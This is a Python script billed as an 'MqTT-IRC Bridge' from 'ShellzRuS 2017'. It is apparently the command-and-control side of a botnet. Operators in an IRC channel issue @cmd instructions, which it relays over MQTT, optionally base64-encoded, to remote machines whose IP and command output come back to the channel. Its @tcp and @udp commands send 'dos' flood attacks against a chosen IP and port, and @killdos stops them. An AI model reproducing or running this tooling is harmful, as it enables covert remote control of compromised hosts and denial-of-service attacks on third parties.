#!/usr/bin/python
# -*- coding: utf-8 -*-
print("""
                                              _..._     
                   .-''-.                    .-'_..._''.  
 __  __   ___     //'` `\|   .--.          .' .'      '.\ 
|  |/  `.'   `.  '/'    '|   |__|         / .'            
|   .-.  .-.   '|'      '|   .--..-,.--. . '              
|  |  |  |  |  |||     /||   |  ||  .-. || |              
|  |  |  |  |  | \'. .'/||   |  || |  | || |              
|  |  |  |  |  |  `--'` ||   |  || |  | |. '              
|  |  |  |  |  |        ||   |  || |  '-  \ '.          . 
|__|  |__|  |__|        || />|__|| |       '. `._____.-'/ 
                        ||//     | |         `-.______ /  
                        |'/      |_|                  `   
                        |/
                        
                   ~ MqTT-IRC Bridge ~
                       ShellzRuS 2017
""")
import socket,string,time,re,binascii,base64,operator,json,argparse,sys
import paho.mqtt.client as mqtt
import paho.mqtt.publish as publish
# version of this bot
bot_version = "1.1 Alpha"
# initialize some vars
CHANNEL="";CHANNEL_="";NICK="";HOST=""
PORT='';pong_once='';priv_user="";data = ''
client="";userdata="";msg=""
# irc user stuff
IDENT="mqirc"
REALNAME="mqirc"
sent_m=False


def isAscii(s):
    return all(ord(c) < 128 for c in s)

def b64encode(s, altchars=None):
    encoded = binascii.b2a_base64(s)[:-1]
    if altchars is not None:
        return _translate(encoded, {'+': altchars[0], '/': altchars[1]})
    return encoded

def urlsafe_b64decode(s):
      s = str(s).strip()
      try:
          return base64.b64decode(s)
      except TypeError:
          padding = len(s) % 4
          if padding == 1:
              return ''
          elif padding == 2:
              s += b'=='
          elif padding == 3:
              s += b'='
          return base64.b64decode(s)

def parse_message(s):
#Breaks a message from an IRC server into its prefix, command, and arguments.
    prefix = ''
    trailing = []
    if not s:
       raise IRCBadMessage("Empty line.")
    if s[0] == ':':
        prefix, s = s[1:].split('', 1)
    if s.find(' :') != -1:
        s, trailing = s.split(' :', 1)
        args = s.split()
        args.append(trailing)
    else:
        args = s.split()
    command = args.pop(0)
    if debug:
        print ("Parsing message: \r\nPrefix: %s Args: %s Trailing: %s \n" %(prefix, args, trailing))
    return args

def on_connect(client, userdata, flags, rc):
    print("Connected with result code "+str(rc))
    client.subscribe(mq_subtop)

def on_message(client, userdata, msg):
    message = str(msg.payload)
    if verbose:
        print("Received message")
    if not base64_on:
        if debug:
            print("Not attempting base64 decode since -b was not specified")
        s.send("PRIVMSG %s :%s \n" %(CHANNEL, message))
    else:     
        try:
            decoded = urlsafe_b64decode(str(message))
        except Exception as e:
            if debug:
                print("Plaintext: %s" % message)
            if isAscii(message):
                s.send("PRIVMSG %s :%s \n" %(CHANNEL, message))
                return
        else:
            decoded = decoded.replace("\"bot version:", "\"bot version\":") # hack cause my json was invalid
            if debug:
                print(decoded)
            try:
                parsed_json = json.loads(decoded)
            except Exception as e:
                if debug:
                    print("Error %s" % e)
                if decoded:
                    s.send("PRIVMSG %s :%s \n" %(CHANNEL, decoded))
            else:
                parsed_ip = (parsed_json['ip'])
                parsed_msg = (parsed_json['output'])
                if debug:
                    print("Parsed JSON: %s %s \n" %(parsed_ip, parsed_msg))
                s.send("PRIVMSG %s :%s %s \n" %(CHANNEL, parsed_ip, parsed_msg))

def handle_message(a, b, c):
    global sent_m
    global tcount
    global rcount
    if not sent_m:
        tcount=0
        rcount=0
    tcount+=1
    rcount+=1
    if tcount % 10 == 0:
        print("Message received: %s" % rcount)
        tcount=0
    on_message(a,b,c)
    sent_m=True

def connect_mqtt():
    
    client = mqtt.Client()
    client.on_connect = on_connect
    client.connect(mq_host, mq_port, 60)
    client.username_pw_set(username=mq_user,password=mq_pass)
    client.on_message = handle_message
    client.loop_start()
    

def mqsend(message):
    # make the request, should give us back some JSON
    client = mqtt.Client()
    publish.single(mq_pubtop, payload=str(message), hostname=mq_host, port=mq_port,auth = {'username':mq_user, 'password':mq_pass})

def identify(irc_auth_):
    if irc_auth_ != "empty":
        if verbose:
            print("Identifying to nickserv with key: %s..." % irc_auth_)
        s.send("PRIVMSG nickserv IDENTIFY %s\r\n" % irc_auth_)
    else:
        s.send("Could not identify with nickserv\n" % CHANNEL)

def join_chan(join_str_):
    if verbose or debug:
        print("Joining %s" % join_str_)
    s.send("JOIN %s \n" % join_str_)
        
# Called after first pong
def init_irc(CHANNEL_,KEY_,irc_auth_):
    identify(irc_auth_)
    time.sleep(1)
    s.send("MODE %s +xiw \n" % NICK)
    if debug or verbose:
        print("Joining (initial channel) %s" % CHANNEL_)
    if KEY_ != "lolololol":
        CHANNEL_ = CHANNEL_ + " " + KEY_
    join_chan(CHANNEL_)
    s.send("MODE %s +v \n"% NICK)
    


def connect_irc(_irc_auth,_key):
    if debug:
        print("Connecting to mqtt...")
    connect_mqtt()
    if verbose:
        print("Connecting to irc with nick %s ...\n" % NICK)
    s.send("NICK %s\r\n" % NICK)
    s.send("USER %s %s 8 :%s\r\n" % (IDENT, HOST, REALNAME))
    time.sleep(2)
    
    #time.sleep(1)
    #init_irc(irc_chan, _KEY)


def part_chan(CHANNEL_):
    if verbose:
        print("Leaving channel %s" % CHANNEL_)
    s.send("PART %s \n" % CHANNEL_)

def quit_irc(sender_):
    s.send("PRIVMSG %s :Shutting down... \r\n" % sender_)
    s.send("QUIT : Peace out!\r\n")
    sys.exit(0)

def register(final, sender_):
    print("Registering with nickserv...")
    s.send("PRIVMSG nickserv :REGISTER %s\n" %(final))
    s.send("PRIVMSG %s :Registered with nickserv. \r\n" % (sender_))

def getnick(data):                          # Return Nickname
    nick = data.split('!')[0]
    nick = nick.replace(':', ' ')
    nick = nick.replace(' ', '')
    nick = nick.strip(' \t\n\r')
    if debug:
        print ("Get nick: %s "% nick)
    return nick

def getchannel(data):                       # Return Channel
    channel = data.split('#')[1]
    channel = channel.split(':')[0]
    channel = '#' + channel
    channel = channel.strip(' \t\n\r')
    if debug:
        print ("Get channel: %s" % channel)
    return channel


def bot_usage(action, sender):
    if debug:
        print("Sending as : %s " % action)
    s.send("%s %s : ======== MQIRC Version %s Bot Commands ========: \r\n" %(action, sender,bot_version))
    s.send("%s %s : Bot responds to the following commands: \r\n" % (action, sender))
    s.send("%s %s : @cmd <message> : Send a message to pubtopic \r\n" % (action, sender))
    s.send("%s %s : @help : Show this help \r\n" % (action, sender))
    s.send("%s %s : @die : Shut down bot \r\n" % (action, sender))
    s.send("%s %s : @echo <string> : Echo a message\r\n" % (action, sender))
    s.send("%s %s : ======== IRC Commands ========:\r\n" %(action, sender))
    s.send("%s %s : @irc : <command> : Send a raw irc command to server\r\n" % (action, sender))
    s.send("%s %s : @register <password> <email> : Register bot with nickserv\r\n" %(action, sender))
    s.send("%s %s : @join : <channel> : Join this channel\r\n" % (action, sender))
    s.send("%s %s : @part : <channel> : Leave this channel\r\n" % (action, sender))
    s.send("%s %s : ======== DDOS Commands ========: \r\n" % (action, sender))
    s.send("%s %s : @tcp <ip> <port> <threads> <secs> : tcp ddos attack\r\n" % (action, sender))
    s.send("%s %s : @udp <ip> <port> <threads> <secs> : tcp udp attack\r\n" % (action, sender))
    s.send("%s %s : @killdos : Kill all running attacks\r\n" % (action, sender))

#### Listen for incoming data
def listen_irc(irc_auth,chan_key):
    global scount
    readbuffer=""
    scount=0
    pong_once=0
    while True:        
        readbuffer=readbuffer+s.recv(1000000)  
        temp=string.split(readbuffer, "\n")
        rawbuffer=readbuffer
        if very_verbose:
            print (readbuffer)                   # Print raw output to screen        
        readbuffer=temp.pop( )
        for line in temp:
            line=string.rstrip(line)
            line=string.split(line)
       
            res = parse_message(str(line))
            final = ''
            for i in range(3, len(res)):
                #print str(res[i])
                final = final + str(res[i])                
                final = final[:-2]
                final = final.replace("'","")
                final = final + " "
            if debug:
                print("\n%s\n" % final)

            if(line[0]=="PING"):
                if verbose:
                    print("Received PING, sending PONG")
                s.send("PONG %s\r\n" % line[1])
                pong_once+=1
                if (pong_once == 1):
                    init_irc(CHANNEL,chan_key,irc_auth)
            elif (line[1]=="PRIVMSG" or line[1]=="NOTICE"):
                action=line[1]
                if verbose:
                    print("Received %s" % action)
                if debug:
                    print("Contents of received %s :\r\n %s" % (action, line))
                if action=="NOTICE" and not notice:
                    pass
                elif action=="NOTICE" and notice:
                    sender = priv_user
                elif action=="PRIVMSG":
                    try:
                        sender = getchannel(rawbuffer)
                    except:
                        sender = getnick(rawbuffer)

                #publish mqtt message
                if re.match(r'^:@cmd.*$', line[3]):
                    scount+=1
                    print("Messages sent: %s" % scount)
                    if verbose:
                        print("Publishing message")
                    if debug:
                        print("Parsing message with contents: \r\n %s " % final)
                    if base64_on:
                        if verbose or debug:
                            print("Encoding message...")
                        final = b64encode(final)
                        if debug:
                            print("Encoded message: \r\n %s" % final)
                    try:
                        mqsend(final)
                    except Exception as e:
                        s.send("%s %s :Error publishing message \r\n" % (action,sender))
                        if verbose:
                            print("Failed to publish message!")
                        if debug:
                            print("Error:\n %s" % e)
                # irc commands
                elif re.match(r'^:@register.*$', line[3]):
                    if verbose:
                        print("Registering with nickserv...")
                    register(final, sender)
                    if debug:
                        print("Registered with nickserv: %s" % final)
                elif re.match(r'^:@irc.*$', line[3]):
                    if verbose:
                        print("Sending raw irc command")
                    if debug:
                        print("Received raw irc command:\n%s\n" % final)
                    s.send("%s \r\n" % final)
                elif re.match(r'^:@echo.*$', line[3]):
                    if debug:
                        print("Received PRIVMSG command:\n%s\n" % final)
                    s.send("%s %s :%s\r\n" % (action,sender,final))
                elif re.match(r'^:@join.*$', line[3]):
                    if verbose:
                        print("Received a join command")
                    join_chan(final)
                elif re.match(r'^:@part.*$', line[3]):
                    if verbose:
                        print("Received a part command")
                    part_chan(final)
                elif re.match(r'^:@help.*$', line[3]):
                    if verbose:
                        print("Sending usage\n")
                    bot_usage(action, sender)
                elif re.match(r'^:@stats.*$',line[3]):
                    bot_status(action,sender)
                elif re.match(r'^:@die.*$', line[3]):
                    if verbose:
                        print("Shutting down...")
                    quit_irc(sender)
                # ddos commands
                elif re.match(r'^:@tcp.*$', line[3]):
                    if debug or verbose:
                        print("Received tcp dos command: %s from %s" % (final,sender))
                    try:
                        mqsend("dos -t %s >/dev/null 2>&1" % final)
                    except Exception as e:
                        s.send("%s %s :Error publishing message\n" % (action,sender))
                        if verbose:
                            print("Failed to publish message!")
                        if debug:
                            print("Error:\n %s" % e)
                elif re.match(r'^:@udp.*$', line[3]):
                    if debug or verbose:
                        print("Received udp dos command: %s from %s" % (final,sender))
                    try:
                        mqsend("dos -u %s >/dev/null 2>&1" % final)
                    except Exception as e:
                        s.send("%s %s :Error publishing message\n" % (action,sender))
                        if verbose:
                            print("Failed to publish message!")
                        if debug:
                            print("Error:\n %s" % e)
                elif re.match(r'^:@killdos.*$', line[3]):
                    if verbose or debug:
                        print("Received a kill from %s, killing all attacks" % sender)
                    s.send("%s %s :Killing all attacks \n" % (action,sender))
                    try:
                        mqsend("dos -k >/dev/null 2>&1")
                    except Exception as e:
                        s.send("%s %s :Error publishing message\n" % (action,sender))
                        if verbose:
                            print("Failed to publish message!")
                        if debug:
                            print("Error:\n %s" % e)
                else:
                    pass
      


parser = argparse.ArgumentParser()
# mqtt options
parser.add_argument('-m','--mq_host',default='localhost', help='Mqtt host to connect to')
parser.add_argument('-p','--mq_port',default='1883', help='Mqtt port to connect to')
parser.add_argument('-u','--mq_user',default='user', help='Mqtt user to auth with')
parser.add_argument('-P','--mq_pass',default='passwd', help='Mqtt password to authenticate with')
parser.add_argument('-s','--mq_subtop',default='in', help='Mqtt topic to subscribe to')
parser.add_argument('-t','--mq_pubtop',default='out', help='Mqtt topic to publish to')
parser.add_argument('-b','--base64_on', nargs='?', default=False, help='Base64')
# irc options
parser.add_argument('-i','--irc_host',default='localhost', help='Irc host to connect to')
parser.add_argument('-I','--irc_port',default='6667', help='Irc port to connect to')
parser.add_argument('-n','--irc_nick',default='mqirc', help='Nick of irc user')
parser.add_argument('-c','--irc_chan',default='#mqtt', help='Irc channel to join')
parser.add_argument('-k','--chan_key',default='lolololol', help='Channel key')
parser.add_argument('-a','--irc_auth',default='empty', help='Password to auth with nickserv')
parser.add_argument('-U','--priv_user',default='user', help='Irc bot owner')
parser.add_argument('-N','--notice', nargs='?', default=False, help='Respond to notices')
# verbosity options
parser.add_argument('-d','--debug', nargs='?', default=False, help='Print debug messages')
parser.add_argument('-v','--verbose', nargs='?', default=False, help='Verbose mode')
parser.add_argument('-vv','--very_verbose', nargs='?', default=False, help='Very Verbose mode: Print all raw output')

ns = parser.parse_args()

mq_host = ns.mq_host if ns.mq_host is not None else "default_mq_host"
mq_port = ns.mq_port if ns.mq_port is not None else "default_mq_port"
mq_user = ns.mq_user if ns.mq_user is not None else "default_mq_user"
mq_pass = ns.mq_pass if ns.mq_pass is not None else "default_mq_pass"
mq_subtop = ns.mq_subtop if ns.mq_subtop is not None else "default_mq_subtop"
mq_pubtop = ns.mq_pubtop if ns.mq_pubtop is not None else "default_mq_pubtop"
irc_host = ns.irc_host if ns.irc_host is not None else "default_irc_host"
irc_port = ns.irc_port if ns.irc_port is not None else "default_irc_port"
irc_nick = ns.irc_nick if ns.irc_nick is not None else "default_irc_nick"
irc_chan = ns.irc_chan if ns.irc_chan is not None else "default_irc_chan"
chan_key = ns.chan_key if ns.chan_key is not None else "default_chan_key"
irc_auth = ns.irc_auth if ns.irc_auth is not None else "default_irc_auth"
priv_user = ns.priv_user if ns.priv_user is not None else "default_priv_user"
debug = ns.debug if ns.debug is not None else "default_debug"
verbose = ns.verbose if ns.verbose is not None else "default_verbose"
very_verbose = ns.very_verbose if ns.very_verbose is not None else "default_very_verbose"
base64_on = ns.base64_on if ns.base64_on is not None else "default_base64_on"
notice = ns.notice if ns.notice is not None else "default_notice"

HOST = irc_host
PORT = int(irc_port)
NICK = irc_nick
CHANNEL = irc_chan
KEY = chan_key

if notice:
    notice=True
    print("Respond to notice: ON")
else:
    print("Respond to notice: OFF")

if base64_on:
    base64_on = True
    print("Base64 ON")
else:
    print("Base64 OFF")
if debug:
    debug = True
    print("Warning: Debug mode is ON")
else:
    print("Debug mode is OFF")

if very_verbose:
    very_verbose = True
    print("Very Verbose mode is ON")
    
if verbose:
    verbose = True
    print("Verbose mode is ON")
    print("IRC Info: %s@%s:%s:%s, owner nick: %s" %(NICK, HOST, PORT, CHANNEL, priv_user))
    print("MQTT Info: %s@%s:%s, subscribe to: %s, publish to: %s " % (mq_user, mq_host, mq_port, mq_subtop, mq_pubtop))
    print("Connecting to ircd...")

try:
    s=socket.socket( )
    s.connect((HOST, PORT))
    connect_irc(irc_auth,KEY)
    listen_irc(irc_auth,KEY)
except KeyboardInterrupt:
    print("Caught signal, shutting down...")
    sys.exit(0)
